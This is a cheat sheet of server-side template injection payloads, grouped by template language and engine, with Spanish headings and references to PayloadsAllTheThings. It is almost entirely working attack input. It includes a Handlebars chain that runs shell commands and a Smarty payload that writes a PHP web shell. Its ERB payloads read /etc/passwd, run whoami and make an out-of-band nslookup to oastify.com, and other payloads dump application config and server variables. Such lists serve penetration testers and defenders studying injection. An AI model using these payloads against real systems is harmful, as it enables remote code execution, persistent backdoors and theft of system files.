
**ASP:**

```
@(1+2)
```

```cs
@{
  // C# código.
}
```

**Java:**

| Template Name | Payload Format               |
| ------------- | ---------------------------- |
| Codepen       | `#{}`                        |
| Freemarker    | `${3*3}`, `#{3*3}`, `[=3*3]` |
| Groovy        | `${9*9}`                     |
| Jinjava       | `{{ }}`                      |
| Pebble        | `{{ }}`                      |
| Spring        | `*{7*7}`                     |
| Thymeleaf     | `[[ ]]`                      |
| Velocity      | `#set($X="") $X`             |
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}

**JavaScript:**

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

**Php:**

|Template Name|Payload Format|
|---|---|
|Blade (Laravel)|`{{ }}`|
|Latte|`{var $X=""}{$X}`|
|Mustache|`{{ }}`|
|Plates|`<?= ?>`|
|Smarty|`{ }`|
|Twig|`{{ }}`|
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}



**Python:**

| Template Name | Payload Format |
| ------------- | -------------- |
| Bottle        | `{{ }}`        |
| Chameleon     | `${ }`         |
| Cheetah       | `${ }`         |
| Django        | `{{ }}`        |
| Jinja2        | `{{ }}`        |
| Mako          | `${ }`         |
| Pystache      | `{{ }}`        |
| Tornado       | `{{ }}`        |
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
{{7*7}}
{{7*'7'}}



**Ruby:**

| Template Name | Payload Format |
| ------------- | -------------- |
| Erb           | `<%= %>`       |
| Erubi         | `<%= %>`       |
| Erubis        | `<%= %>`       |
| HAML          | `#{ }`         |
| Liquid        | `{{ }}`        |
| Mustache      | `{{ }}`        |
| Slim          | `#{ }`         |
<%= 7 * 7 %>
#{ 7 * 7 }
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>


**Referencias:** 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/ASP.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md

